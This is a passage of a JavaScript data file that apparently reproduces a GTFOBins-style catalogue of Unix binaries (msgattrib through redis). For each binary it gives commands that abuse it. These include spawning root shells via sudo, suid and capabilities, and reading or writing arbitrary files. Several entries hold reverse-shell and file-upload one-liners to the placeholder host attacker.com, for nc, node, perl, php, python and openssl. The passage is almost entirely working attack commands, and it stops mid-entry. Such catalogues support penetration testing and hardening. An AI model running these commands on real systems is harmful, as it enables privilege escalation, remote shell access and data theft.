            "suid": ["sudo install -m =xs $(which msgattrib) .\n\nLFILE=file_to_read\n./msgattrib -P $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo msgattrib -P $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ msgcat ============ */
    {
        name: "msgcat",
        functions: {
            "file-read": ["LFILE=file_to_read\nmsgcat -P $LFILE"],
            "suid": ["sudo install -m =xs $(which msgcat) .\n\nLFILE=file_to_read\n./msgcat -P $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo msgcat -P $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ msgconv ============ */
    {
        name: "msgconv",
        functions: {
            "file-read": ["LFILE=file_to_read\nmsgconv -P $LFILE"],
            "suid": ["sudo install -m =xs $(which msgconv) .\n\nLFILE=file_to_read\n./msgconv -P $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo msgconv -P $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ msgfilter ============ */
    {
        name: "msgfilter",
        functions: {
            "shell": ["echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"],
            "file-read": ["LFILE=file_to_read\nmsgfilter -P -i \"LFILE\" /bin/cat"],
            "suid": ["sudo install -m =xs $(which msgfilter) .\n\necho x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'"],
            "sudo": ["echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ msgmerge ============ */
    {
        name: "msgmerge",
        functions: {
            "file-read": ["LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null"],
            "suid": ["sudo install -m =xs $(which msgmerge) .\n\nLFILE=file_to_read\n./msgmerge -P $LFILE /dev/null"],
            "sudo": ["LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ msguniq ============ */
    {
        name: "msguniq",
        functions: {
            "file-read": ["LFILE=file_to_read\nmsguniq -P $LFILE"],
            "suid": ["sudo install -m =xs $(which msguniq) .\n\nLFILE=file_to_read\n./msguniq -P $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo msguniq -P $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ mtr ============ */
    {
        name: "mtr",
        functions: {
            "file-read": ["LFILE=file_to_read\nmtr --raw -F \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\""]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ multitime ============ */
    {
        name: "multitime",
        functions: {
            "shell": ["multitime /bin/sh"],
            "suid": ["sudo install -m =xs $(which multitime) .\n\n./multitime /bin/sh -p"],
            "sudo": ["sudo multitime /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ mv ============ */
    {
        name: "mv",
        functions: {
            "suid": ["sudo install -m =xs $(which mv) .\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE"],
            "sudo": ["LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ mysql ============ */
    {
        name: "mysql",
        functions: {
            "shell": ["mysql -e '\\! /bin/sh'"],
            "library-load": ["mysql --default-auth ../../../../../path/to/lib"],
            "sudo": ["sudo mysql -e '\\! /bin/sh'"],
            "limited-suid": ["sudo install -m =xs $(which mysql) .\n\n./mysql -e '\\! /bin/sh'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ nano ============ */
    {
        name: "nano",
        functions: {
            "shell": ["nano\n^R^X\nreset; sh 1>&0 2>&0"],
            "file-write": ["nano file_to_write\nDATA\n^O"],
            "file-read": ["nano file_to_read"],
            "sudo": ["sudo nano\n^R^X\nreset; sh 1>&0 2>&0"],
            "limited-suid": ["sudo install -m =xs $(which nano) .\n\n./nano -s /bin/sh\n/bin/sh\n^T"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ nasm ============ */
    {
        name: "nasm",
        functions: {
            "file-read": ["LFILE=file_to_read\nnasm -@ $LFILE"],
            "suid": ["sudo install -m =xs $(which nasm) .\n\nLFILE=file_to_read\n./nasm -@ $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo nasm -@ $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ nawk ============ */
    {
        name: "nawk",
        functions: {
            "shell": ["nawk 'BEGIN {system(\"/bin/sh\")}'"],
            "file-write": ["LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"],
            "file-read": ["LFILE=file_to_read\nnawk '//' \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which nawk) .\n\nLFILE=file_to_read\n./nawk '//' \"$LFILE\""],
            "sudo": ["sudo nawk 'BEGIN {system(\"/bin/sh\")}'"],
            "limited-suid": ["sudo install -m =xs $(which nawk) .\n\n./nawk 'BEGIN {system(\"/bin/sh\")}'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ nc ============ */
    {
        name: "nc",
        functions: {
            "reverse-shell": ["RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT"],
            "bind-shell": ["LPORT=12345\nnc -l -p $LPORT -e /bin/sh"],
            "file-upload": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\""],
            "file-download": ["LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\""],
            "sudo": ["RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT"],
            "limited-suid": ["sudo install -m =xs $(which nc) .\n\nRHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ ncdu ============ */
    {
        name: "ncdu",
        functions: {
            "shell": ["ncdu\nb"],
            "sudo": ["sudo ncdu\nb"],
            "limited-suid": ["sudo install -m =xs $(which ncdu) .\n\n./ncdu\nb"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ ncftp ============ */
    {
        name: "ncftp",
        functions: {
            "shell": ["ncftp\n!/bin/sh"],
            "suid": ["sudo install -m =xs $(which ncftp) .\n\n./ncftp\n!/bin/sh -p"],
            "sudo": ["sudo ncftp\n!/bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ neofetch ============ */
    {
        name: "neofetch",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nneofetch --config $TF"],
            "file-read": ["LFILE=file_to_read\nneofetch --ascii $LFILE"],
            "sudo": ["TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ nft ============ */
    {
        name: "nft",
        functions: {
            "file-read": ["LFILE=file_to_read\nnft -f \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which nft) .\n\nLFILE=file_to_read\n./nft -f \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo nft -f \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ nice ============ */
    {
        name: "nice",
        functions: {
            "shell": ["nice /bin/sh"],
            "suid": ["sudo install -m =xs $(which nice) .\n\n./nice /bin/sh -p"],
            "sudo": ["sudo nice /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ nl ============ */
    {
        name: "nl",
        functions: {
            "file-read": ["LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE"],
            "suid": ["sudo install -m =xs $(which nl) .\n\nLFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ nm ============ */
    {
        name: "nm",
        functions: {
            "file-read": ["LFILE=file_to_read\nnm @$LFILE"],
            "suid": ["sudo install -m =xs $(which nm) .\n\nLFILE=file_to_read\n./nm @$LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo nm @$LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ nmap ============ */
    {
        name: "nmap",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF"],
            "file-write": ["LFILE=file_to_write\nnmap -oG=$LFILE DATA"],
            "file-read": ["nmap -iL file_to_read"],
            "suid": ["sudo install -m =xs $(which nmap) .\n\nLFILE=file_to_write\n./nmap -oG=$LFILE DATA"],
            "sudo": ["TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF"],
            "limited-suid": ["sudo install -m =xs $(which nmap) .\n\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ node ============ */
    {
        name: "node",
        functions: {
            "shell": ["node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"],
            "bind-shell": ["export LPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").createServer(function (client) { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }).listen(process.env.LPORT)'"],
            "file-write": ["node -e 'require(\"fs\").writeFileSync(\"file_to_write\", \"DATA\")'"],
            "file-read": ["node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/etc/passwd\"))'"],
            "suid": ["sudo install -m =xs $(which node) .\n\n./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"],
            "sudo": ["sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"],
            "capabilities": ["cp $(which node) .\nsudo setcap cap_setuid+ep node\n\n./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities"]
    },

    /* ============ nohup ============ */
    {
        name: "nohup",
        functions: {
            "shell": ["nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""],
            "command": ["COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out"],
            "suid": ["sudo install -m =xs $(which nohup) .\n\n./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""],
            "sudo": ["sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ npm ============ */
    {
        name: "npm",
        functions: {
            "shell": ["npm exec /bin/sh\n\nTF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nnpm -C $TF i"],
            "sudo": ["TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ nroff ============ */
    {
        name: "nroff",
        functions: {
            "shell": ["TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff"],
            "file-read": ["LFILE=file_to_read\nnroff $LFILE"],
            "sudo": ["TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ nsenter ============ */
    {
        name: "nsenter",
        functions: {
            "shell": ["nsenter /bin/sh"],
            "sudo": ["sudo nsenter /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ntpdate ============ */
    {
        name: "ntpdate",
        functions: {
            "file-read": ["LFILE=file_to_read\nntpdate -a x -k $LFILE -d localhost"],
            "suid": ["sudo install -m =xs $(which ntpdate) .\n\nLFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost"],
            "sudo": ["LFILE=file_to_read\nsudo ntpdate -a x -k $LFILE -d localhost"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ octave ============ */
    {
        name: "octave",
        functions: {
            "shell": ["octave-cli --eval 'system(\"/bin/sh\")'"],
            "file-write": ["octave-cli --eval 'filename = \"file_to_write\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"],
            "file-read": ["octave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"],
            "sudo": ["sudo octave-cli --eval 'system(\"/bin/sh\")'"],
            "limited-suid": ["sudo install -m =xs $(which octave) .\n\n./octave-cli --eval 'system(\"/bin/sh\")'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ od ============ */
    {
        name: "od",
        functions: {
            "file-read": ["LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which od) .\n\nLFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ openssl ============ */
    {
        name: "openssl",
        functions: {
            "file-write": ["LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\""],
            "file-read": ["LFILE=file_to_read\nopenssl enc -in \"$LFILE\""],
            "library-load": ["openssl req -engine ./lib.so"],
            "suid": ["sudo install -m =xs $(which openssl) .\n\nLFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\""],
            "sudo": ["RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ openvpn ============ */
    {
        name: "openvpn",
        functions: {
            "shell": ["openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"],
            "file-read": ["LFILE=file_to_read\nopenvpn --config \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which openvpn) .\n\n./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'"],
            "sudo": ["sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ openvt ============ */
    {
        name: "openvt",
        functions: {
            "sudo": ["COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF"]
        },
        contexts: ["sudo"]
    },

    /* ============ opkg ============ */
    {
        name: "opkg",
        functions: {
            "sudo": ["TF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\nsudo opkg install x_1.0_all.deb"]
        },
        contexts: ["sudo"]
    },

    /* ============ pandoc ============ */
    {
        name: "pandoc",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\npandoc -L $TF /dev/null"],
            "file-write": ["LFILE=file_to_write\necho DATA | pandoc -t plain -o \"$LFILE\""],
            "file-read": ["LFILE=file_to_read\npandoc -t plain \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which pandoc) .\n\nLFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\""],
            "sudo": ["TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\nsudo pandoc -L $TF /dev/null"],
            "limited-suid": ["sudo install -m =xs $(which pandoc) .\n\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\n./pandoc -L $TF /dev/null"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ paste ============ */
    {
        name: "paste",
        functions: {
            "file-read": ["LFILE=file_to_read\npaste $LFILE"],
            "suid": ["sudo install -m =xs $(which paste) .\n\nLFILE=file_to_read\npaste $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo paste $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ pax ============ */
    {
        name: "pax",
        functions: {
            "file-read": ["LFILE=file_to_read\npax -w \"$LFILE\""]
        },
        contexts: ["unprivileged"]
    },

    /* ============ pdb ============ */
    {
        name: "pdb",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont"],
            "sudo": ["TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ pdflatex ============ */
    {
        name: "pdflatex",
        functions: {
            "shell": ["pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"],
            "sudo": ["sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"],
            "limited-suid": ["sudo install -m =xs $(which pdflatex) .\n\n./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ pdftex ============ */
    {
        name: "pdftex",
        functions: {
            "shell": ["pdftex --shell-escape '\\write18{/bin/sh}\\end'"],
            "sudo": ["sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'"],
            "limited-suid": ["sudo install -m =xs $(which pdftex) .\n\n./pdftex --shell-escape '\\write18{/bin/sh}\\end'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ perf ============ */
    {
        name: "perf",
        functions: {
            "shell": ["perf stat /bin/sh"],
            "suid": ["sudo install -m =xs $(which perf) .\n\n./perf stat /bin/sh -p"],
            "sudo": ["sudo perf stat /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ perl ============ */
    {
        name: "perl",
        functions: {
            "shell": ["perl -e 'exec \"/bin/sh\";'"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"],
            "file-read": ["LFILE=file_to_read\nperl -ne print $LFILE"],
            "suid": ["sudo install -m =xs $(which perl) .\n\n./perl -e 'exec \"/bin/sh\";'"],
            "sudo": ["sudo perl -e 'exec \"/bin/sh\";'"],
            "capabilities": ["cp $(which perl) .\nsudo setcap cap_setuid+ep perl\n\n./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities"]
    },

    /* ============ perlbug ============ */
    {
        name: "perlbug",
        functions: {
            "shell": ["perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"],
            "sudo": ["sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ pexec ============ */
    {
        name: "pexec",
        functions: {
            "shell": ["pexec /bin/sh"],
            "suid": ["sudo install -m =xs $(which pexec) .\n\n./pexec /bin/sh -p"],
            "sudo": ["sudo pexec /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ pg ============ */
    {
        name: "pg",
        functions: {
            "shell": ["pg /etc/profile\n!/bin/sh"],
            "file-read": ["pg file_to_read"],
            "suid": ["sudo install -m =xs $(which pg) .\n\n./pg file_to_read"],
            "sudo": ["sudo pg /etc/profile\n!/bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ php ============ */
    {
        name: "php",
        functions: {
            "shell": ["export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
            "file-write": ["export LFILE=file_to_write\nphp -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'"],
            "file-read": ["export LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'"],
            "suid": ["sudo install -m =xs $(which php) .\n\nCMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\""],
            "sudo": ["CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\""],
            "capabilities": ["cp $(which php) .\nsudo setcap cap_setuid+ep php\n\nCMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\""]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities"]
    },

    /* ============ pic ============ */
    {
        name: "pic",
        functions: {
            "shell": ["pic -U\n.PS\nsh X sh X"],
            "file-read": ["LFILE=file_to_read\npic $LFILE"],
            "sudo": ["sudo pic -U\n.PS\nsh X sh X"],
            "limited-suid": ["sudo install -m =xs $(which pic) .\n\n./pic -U\n.PS\nsh X sh X"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ pico ============ */
    {
        name: "pico",
        functions: {
            "shell": ["pico\n^R^X\nreset; sh 1>&0 2>&0"],
            "file-write": ["pico file_to_write\nDATA\n^O"],
            "file-read": ["pico file_to_read"],
            "sudo": ["sudo pico\n^R^X\nreset; sh 1>&0 2>&0"],
            "limited-suid": ["sudo install -m =xs $(which pico) .\n\n./pico -s /bin/sh\n/bin/sh\n^T"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ pidstat ============ */
    {
        name: "pidstat",
        functions: {
            "command": ["COMMAND=id\npidstat -e $COMMAND"],
            "suid": ["sudo install -m =xs $(which pidstat) .\n\nCOMMAND=id\n./pidstat -e $COMMAND"],
            "sudo": ["COMMAND=id\nsudo pidstat -e $COMMAND"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ pip ============ */
    {
        name: "pip",
        functions: {
            "shell": ["TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF"],
            "sudo": ["TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ pkexec ============ */
    {
        name: "pkexec",
        functions: {
            "sudo": ["sudo pkexec /bin/sh"]
        },
        contexts: ["sudo"]
    },

    /* ============ pkg ============ */
    {
        name: "pkg",
        functions: {
            "sudo": ["TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\nsudo pkg install -y --no-repo-update ./x-1.0.txz"]
        },
        contexts: ["sudo"]
    },

    /* ============ posh ============ */
    {
        name: "posh",
        functions: {
            "shell": ["posh"],
            "sudo": ["sudo posh"],
            "limited-suid": ["sudo install -m =xs $(which posh) .\n\n./posh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ pr ============ */
    {
        name: "pr",
        functions: {
            "file-read": ["LFILE=file_to_read\npr -T $LFILE"],
            "suid": ["sudo install -m =xs $(which pr) .\n\nLFILE=file_to_read\npr -T $LFILE"],
            "sudo": ["LFILE=file_to_read\npr -T $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ pry ============ */
    {
        name: "pry",
        functions: {
            "shell": ["pry\nsystem(\"/bin/sh\")"],
            "sudo": ["sudo pry\nsystem(\"/bin/sh\")"],
            "limited-suid": ["sudo install -m =xs $(which pry) .\n\n./pry\nsystem(\"/bin/sh\")"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ psftp ============ */
    {
        name: "psftp",
        functions: {
            "shell": ["psftp\n!/bin/sh"],
            "sudo": ["sudo psftp\n!/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which psftp) .\n\nsudo psftp\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ psql ============ */
    {
        name: "psql",
        functions: {
            "shell": ["psql\n\\?\n!/bin/sh"],
            "sudo": ["psql\n\\?\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ptx ============ */
    {
        name: "ptx",
        functions: {
            "file-read": ["LFILE=file_to_read\nptx -w 5000 \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which ptx) .\n\nLFILE=file_to_read\n./ptx -w 5000 \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ puppet ============ */
    {
        name: "puppet",
        functions: {
            "shell": ["puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""],
            "file-write": ["LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\""],
            "file-read": ["LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE"],
            "sudo": ["sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ pwsh ============ */
    {
        name: "pwsh",
        functions: {
            "shell": ["pwsh"],
            "file-write": ["export LFILE=file_to_write\npwsh -c '\"DATA\" | Out-File $env:LFILE'"],
            "sudo": ["sudo pwsh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ python ============ */
    {
        name: "python",
        functions: {
            "shell": ["python -c 'import os; os.system(\"/bin/sh\")'"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"],
            "file-write": ["python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'"],
            "file-read": ["python -c 'print(open(\"file_to_read\").read())'"],
            "library-load": ["python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"],
            "suid": ["sudo install -m =xs $(which python) .\n\n./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"],
            "sudo": ["sudo python -c 'import os; os.system(\"/bin/sh\")'"],
            "capabilities": ["cp $(which python) .\nsudo setcap cap_setuid+ep python\n\n./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities"]
    },

    /* ============ rake ============ */
    {
        name: "rake",
        functions: {
            "shell": ["rake -p '`/bin/sh 1>&0`'"],
            "file-read": ["LFILE=file-to-read\nrake -f $LFILE"],
            "sudo": ["sudo rake -p '`/bin/sh 1>&0`'"],
            "limited-suid": ["sudo install -m =xs $(which rake) .\n\n./rake -p '`/bin/sh 1>&0`'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ rc ============ */
    {
        name: "rc",
        functions: {
            "shell": ["rc -c '/bin/sh'"],
            "suid": ["sudo install -m =xs $(which rc) .\n\n./rc -c '/bin/sh -p'"],
            "sudo": ["sudo rc -c '/bin/sh'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ readelf ============ */
    {
        name: "readelf",
        functions: {
            "file-read": ["LFILE=file_to_read\nreadelf -a @$LFILE"],
            "suid": ["sudo install -m =xs $(which readelf) .\n\nLFILE=file_to_read\n./readelf -a @$LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo readelf -a @$LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ red ============ */
    {
        name: "red",
        functions: {
            "file-write": ["red file_to_write\na\nDATA\n.\nw\nq"],
            "file-read": ["red file_to_read\n,p\nq"],
            "sudo": ["sudo red file_to_write\na\nDATA\n.\nw\nq"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ redcarpet ============ */
    {
        name: "redcarpet",
        functions: {
            "file-read": ["LFILE=file_to_read\nredcarpet \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo redcarpet \"$LFILE\""]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ redis ============ */
    {
        name: "redis",
        functions: {
            "file-write": ["IP=127.0.0.1\nredis-cli -h $IP\nconfig set dir dir_to_write_to\nconfig set dbfilename file_to_write\nset x \"DATA\"\nsave"]
        },
        contexts: ["unprivileged"]
    },

    /* ============ restic ============ */
    {
        name: "restic",
        functions: {
